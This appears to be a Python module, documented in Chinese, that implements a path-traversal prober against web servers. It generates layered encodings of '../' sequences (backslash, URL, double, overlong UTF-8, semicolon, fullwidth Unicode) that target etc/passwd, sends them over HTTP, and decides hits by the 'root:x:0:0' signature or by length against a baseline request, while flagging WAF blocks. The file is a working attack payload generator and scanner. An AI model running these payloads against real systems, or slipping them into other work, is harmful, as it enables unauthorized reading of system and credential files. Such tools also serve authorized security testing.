"""路径穿越探测：编码阶梯、客户端与服务端归一化差异及基线对照判据。"""

from __future__ import annotations

import copy
import re
import threading
from dataclasses import dataclass

MAX_REQUESTS = 64
MAX_VARIANTS = 128
MAX_DEPTH = 4
LENGTH_THRESHOLD = 16
DEFAULT_TARGET_FILE = "etc/passwd"
SIGNATURE = "root:x:0:0"

LAYERS = ("plain", "backslash", "url-encoded", "double-encoded", "overlong-utf8",
          "semicolon", "dot-truncation", "unicode-normalized", "absolute")

LAYER_TEMPLATES = {
    "plain": "../",
    "backslash": "..\\",
    "url-encoded": "..%2f",
    "double-encoded": "%252e%252e%252f",
    "overlong-utf8": "%c0%ae%c0%ae%2f",
    "semicolon": "..;/",
    "dot-truncation": ".../",
    "unicode-normalized": "%ef%bc%8e%ef%bc%8e%2f",
}

WAF_MARKERS = ("access denied", "blocked by waf")


class ProbeError(ValueError):
    """变体生成、发送或判定被拒绝时抛出。"""

    def __init__(self, code, detail=None):
        super().__init__(code)
        self.code = code
        self.detail = detail


@dataclass(frozen=True)
class Variant:
    layer: str
    raw: str
    key: str


@dataclass(frozen=True)
class Response:
    status: int
    body: str


@dataclass(frozen=True)
class ProbeRecord:
    layer: str
    raw: str
    key: str
    baseline_status: int
    baseline_length: int
    baseline_body: str
    variant_status: int
    variant_body: str


@dataclass(frozen=True)
class Verdict:
    key: str
    layer: str
    hit: bool
    reason: str


def variant_key(raw, *, platform="posix"):
    """变体的去重键：posix 下就是原串，windows 下按段剥离尾随点与空格。"""
    if platform == "posix":
        return raw
    if platform != "windows":
        raise ProbeError("PROBE_VARIANT_INVALID", f"unknown platform: {platform!r}")
    parts = re.split(r"([/\\])", raw)
    for index in range(0, len(parts), 2):
        parts[index] = parts[index].rstrip(". ")
    return "".join(parts)


def baseline_path(target, length):
    """构造与变体等长的正常路径，用于基线对照。"""
    return target.rstrip("/") + "/" + "a" * length


class PathTraversalProber:
    """生成穿越变体、对照基线并给出命中判定。"""

    def __init__(self, *, transport=None, max_requests=MAX_REQUESTS,
                 max_depth=MAX_DEPTH, signature=SIGNATURE,
                 threshold=LENGTH_THRESHOLD):
        self.transport = transport
        self.max_requests = max_requests
        self.max_depth = max_depth
        self.signature = signature
        self.threshold = threshold
        self._baselines = {}
        self._probed = []
        self._counters = {"generated": 0, "sent": 0, "requests": 0, "hits": 0}
        self._lock = threading.RLock()

    def generate_variants(self, depth=2, *, target_file=DEFAULT_TARGET_FILE):
        if (isinstance(depth, bool) or not isinstance(depth, int)
                or not 1 <= depth <= self.max_depth):
            raise ProbeError(
                "PROBE_VARIANT_INVALID",
                f"depth must be an int in [1, {self.max_depth}], got {depth!r}")
        variants = []
        for layer in LAYERS:
            if layer == "absolute":
                raw = "/" + target_file
            else:
                raw = LAYER_TEMPLATES[layer] * depth + target_file
            variants.append(Variant(layer, raw, variant_key(raw)))
        with self._lock:
            self._counters["generated"] += len(variants)
        return tuple(variants)

    def dedupe(self, variants, *, platform="posix"):
        seen = set()
        kept = []
        for variant in variants:
            key = variant_key(variant.raw, platform=platform)
            if key in seen:
                continue
            seen.add(key)
            kept.append(variant)
        return tuple(kept)

    def send(self, target, variants):
        if not isinstance(target, str) or not target.startswith(("http://", "https://")):
            raise ProbeError("PROBE_TARGET_INVALID",
                             f"only http/https targets are allowed: {target!r}")
        variants = tuple(variants)
        if not variants:
            return ()
        with self._lock:
            missing = {}
            for variant in variants:
                cache_key = (target, len(variant.raw))
                if cache_key not in self._baselines and cache_key not in missing:
                    missing[cache_key] = baseline_path(target, len(variant.raw))
            if len(missing) + len(variants) > self.max_requests:
                raise ProbeError(
                    "PROBE_REQUEST_LIMIT",
                    f"need {len(missing) + len(variants)} requests, "
                    f"budget is {self.max_requests}")
            base = target.rstrip("/")
            records = []
            for cache_key, url in missing.items():
                self._baselines[cache_key] = self._request(url)
            for variant in variants:
                baseline = self._baselines[(target, len(variant.raw))]
                response = self._request(base + "/" + variant.raw)
                record = ProbeRecord(
                    layer=variant.layer, raw=variant.raw, key=variant.key,
                    baseline_status=baseline.status,
                    baseline_length=len(baseline.body),
                    baseline_body=baseline.body,
                    variant_status=response.status,
                    variant_body=response.body)
                self._probed.append(record)
                self._counters["sent"] += 1
                records.append(record)
            return tuple(records)

    def _request(self, url):
        try:
            response = self.transport(url)
        except ProbeError:
            raise
        except Exception as exc:
            raise ProbeError("PROBE_TRANSPORT_FAILED", str(exc)) from exc
        self._counters["requests"] += 1
        return response

    def judge(self, records):
        verdicts = []
        hits = 0
        for record in records:
            body = record.variant_body
            lowered = body.lower()
            if self.signature in body:
                hit, reason = True, "signature"
            elif (record.variant_status in (403, 429)
                    or any(marker in lowered for marker in WAF_MARKERS)):
                hit, reason = False, "undecidable"
            elif (record.variant_status != record.baseline_status
                    and record.variant_status == 200
                    and body != record.baseline_body
                    and abs(len(body) - record.baseline_length) >= self.threshold):
                hit, reason = True, "length"
            else:
                hit, reason = False, "none"
            hits += 1 if hit else 0
            verdicts.append(Verdict(record.key, record.layer, hit, reason))
        with self._lock:
            self._counters["hits"] += hits
        return tuple(verdicts)

    def report(self, verdicts):
        by_layer = {}
        hit_keys = []
        undecidable = 0
        for verdict in verdicts:
            if verdict.hit:
                by_layer[verdict.layer] = by_layer.get(verdict.layer, 0) + 1
                hit_keys.append(verdict.key)
            elif verdict.reason == "undecidable":
                undecidable += 1
        hits = len(hit_keys)
        return {
            "total": len(verdicts),
            "hits": hits,
            "misses": len(verdicts) - hits - undecidable,
            "undecidable": undecidable,
            "by_layer": dict(sorted(by_layer.items())),
            "hit_keys": sorted(hit_keys),
        }

    def snapshot(self):
        with self._lock:
            return {
                "baselines": copy.deepcopy(self._baselines),
                "probed": copy.deepcopy(self._probed),
                "counters": dict(self._counters),
            }

    def restore(self, state):
        if not isinstance(state, dict):
            raise ProbeError("PROBE_SNAPSHOT_INVALID", "state must be a dict")
        baselines = state.get("baselines")
        probed = state.get("probed")
        counters = state.get("counters")
        valid = (
            isinstance(baselines, dict)
            and all(isinstance(key, tuple) and len(key) == 2
                    and isinstance(key[0], str)
                    and isinstance(key[1], int) and not isinstance(key[1], bool)
                    and isinstance(value, Response)
                    for key, value in baselines.items())
            and isinstance(probed, (list, tuple))
            and all(isinstance(record, ProbeRecord) for record in probed)
            and isinstance(counters, dict)
            and set(counters) == set(self._counters)
            and all(isinstance(value, int) and not isinstance(value, bool)
                    for value in counters.values())
        )
        if not valid:
            raise ProbeError("PROBE_SNAPSHOT_INVALID",
                             "state must contain baselines, probed and counters")
        with self._lock:
            self._baselines = copy.deepcopy(baselines)
            self._probed = copy.deepcopy(list(probed))
            self._counters = dict(counters)

    def stats(self):
        with self._lock:
            return dict(self._counters)
